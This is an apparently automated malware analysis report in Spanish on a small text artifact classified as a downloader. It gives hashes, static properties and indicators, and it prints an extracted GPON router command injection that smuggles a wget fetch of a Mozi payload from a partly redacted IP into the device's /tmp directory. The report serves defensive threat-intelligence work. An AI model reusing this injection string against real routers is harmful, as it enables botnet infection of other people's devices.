# 🧬 Payload Analysis

`cd8d39fd76877433674fa23443dce7c16825e700009b2fd7c616464b7e98c1c0`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 320 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://103.199.123.XXX:57394/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:40:04.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `cd8d39fd76877433674fa23443dce7c16825e700009b2fd7c616464b7e98c1c0`
- **MD5:** `d98d3eb49f330b9760af4372de7d94fc`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 320 B |
| Entropía | 5.45 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://103.199.123.XXX:57394/Mozi.m+-O+->/tmp/gpon80;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://103.199.123.XXX:57394/Mozi.m+-O+- | strings |
| ip | 103.199.123.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://103.199.123.XXX:57394/Mozi.m+-O+->/tmp/gpon80;s | strings |
| hash | cd8d39fd76877433674fa23443dce7c16825e700009b2fd7c616464b7e98c1c0 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
